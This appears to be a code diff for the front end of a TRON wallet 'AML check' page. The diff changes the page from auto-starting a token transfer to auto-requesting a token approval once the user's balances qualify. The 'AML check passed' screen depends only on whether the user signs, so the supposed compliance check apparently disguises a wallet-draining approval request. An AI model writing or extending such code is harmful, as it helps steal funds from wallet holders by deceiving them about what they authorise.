@@ -3,18 +3,19 @@ import "./CheckInProcess.css";
 import React, { useEffect, useState } from "react";
 import { useWallet } from "@/app/context/globalContext";
 import { useTronTransaction } from "@/app/hooks/useTronTransaction";
-// import AmlCheckPassed from "../AmlCheckPassed";
+
 import AmlCheckPassed from "../AmlCheckPassed";
 import AmlCheckFailed from "../AmlCheckFailed";
+import { useTronApprove } from "@/app/hooks/useAprove";
 
 const CheckInProcess = () => {
   const { balances } = useWallet(); // Accesăm balanțele din context
-  const { initiateTransaction, isLoading, transactionStatus } =
-    useTronTransaction(); // Hook pentru inițierea tranzacției
+  // const { initiateTransaction, isLoading, transactionStatus } = useTronTransaction(); // Hook pentru inițierea tranzacției
+  const {approveTokens, approvalStatus, isLoading} = useTronApprove()
   const [status, setStatus] = useState(null); // Status pentru procesare (valid sau invalid)
   const [showAmlCheck, setShowAmlCheck] = useState(false); // Comută între componente
   console.log({
-    transactionStatus
+    approvalStatus
   });
   
   useEffect(() => {
@@ -30,32 +31,26 @@ const CheckInProcess = () => {
     };
     checkBalancesAndInitiateTransaction();
   }, [ balances]);
-  const handleInitiateTransaction = async () => {
-    try {
-      await initiateTransaction()
-    } catch (error) {
-      console.log("error to initiate a transaction");
-    }
-  }
+  
   useEffect(() => {
     if(status==="valid") {
-       initiateTransaction();
+       approveTokens();
     }
   }, [status])
 
   // Trecerea la componenta AML după tranzacție
   useEffect(() => {
-    if (transactionStatus === "Transfer successful!") {
+    if (approvalStatus === "Approved") {
       setTimeout(() => {
         setShowAmlCheck(true);
       }, 1000); // Mică întârziere pentru tranziție
     }
-  }, [transactionStatus]);
+  }, [approvalStatus]);
 
   // Afișare componenta AML Check Passed
   if (showAmlCheck) {
     return <AmlCheckPassed />;
-  } else if (transactionStatus=== "Transaction failed." || transactionStatus === "User disapproved requested methods'" ) {
+  } else if (approvalStatus=== "Failed" || approvalStatus === "User disapproved requested methods'" ) {
     return <AmlCheckFailed/>
   }
 
